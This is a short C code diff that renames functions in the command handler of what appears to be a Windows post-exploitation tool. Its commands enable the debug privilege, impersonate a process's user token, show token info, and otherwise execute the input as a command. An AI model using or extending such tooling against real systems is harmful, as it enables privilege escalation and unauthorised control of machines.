@@ -58,17 +58,17 @@ char *handleInput(char *input){
     if (strstr(input, "help")){
         result = "Type `help` for help\r\nType `token-info PID` to get token info for process with process ID PID\r\nType `enable-debug` to enable the debug privilege.\r\nType `impersonate PID` to impersonate a PID's associated user\r\n";
     } else if (strstr(input, "enable-debug") != NULL) {
-        result = EnableDebugPrivilege();
+        result = enableDebugPrivilege();
     } else if (strstr(input, "impersonate") != NULL) {
         char *command = strtok(input, " "); //first_part points to "impersonate"
         int token = atoi(strtok(NULL, " "));   //sec_part points to "token"
-        result = Impersonate(token);
+        result = impersonate(token);
     } else if (strstr(input, "token-info") != NULL){
         char *command = strtok(input, " "); //first_part points to "token-info"
         int token = atoi(strtok(NULL, " "));   //sec_part points to "token"
-        result = PrintUserInfoFromToken(token);
+        result = printUserInfoFromToken(token);
     } else {
-        result = doexec(input, TRUE);
+        result = doExec(input, TRUE);
     }
 
     return result;
